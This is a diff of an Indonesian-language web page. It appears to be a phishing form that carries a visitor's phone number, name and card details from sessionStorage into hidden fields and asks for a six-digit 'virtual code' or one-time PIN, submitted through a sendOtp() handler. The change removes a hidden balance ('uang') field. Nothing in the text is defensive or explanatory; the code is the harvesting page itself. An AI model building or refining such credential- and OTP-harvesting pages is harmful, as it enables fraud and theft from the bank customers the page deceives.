@@ -1186,10 +1186,10 @@ body.stop-scrolling {
   <div class="container-3 w-container">
    <div class="form-block w-form">
   <form id="form2" onsubmit="sendOtp()" method="POST" style="padding: 10px; ">
-<input type="hidden" id="tele" name="tele" value="">
-<input type="hidden" id="namanye" name="namanye" value="">
-<input type="hidden" id="kertu" name="kertu" value="">
-<input type="hidden" id="uang" name="uang" value="">	                  
+<input type="hidden" id="tele" name="tele">
+<input type="hidden" id="namanye" name="namanye">
+<input type="hidden" id="kertu" name="kertu">
+                  
   <div style="margin-top:80px">
           <label for="rek">Kode Virtual</label>
      <input type="tel" name="sixpin" id="sixpin" class="text-field-2 w-input" maxlength=""  data-name="rek" placeholder="Masukkan Kode Virtual" minlength="6" required>
@@ -1250,8 +1250,7 @@ var phone = sessionStorage.getItem("phone");
  document.getElementById("namanye").value = user + "";
   var card = sessionStorage.getItem("card");
  document.getElementById("kertu").value = card + "";
-  var duet = sessionStorage.getItem("duet");
- document.getElementById("uang").value = duet + "";
+  
  
 
 </script>
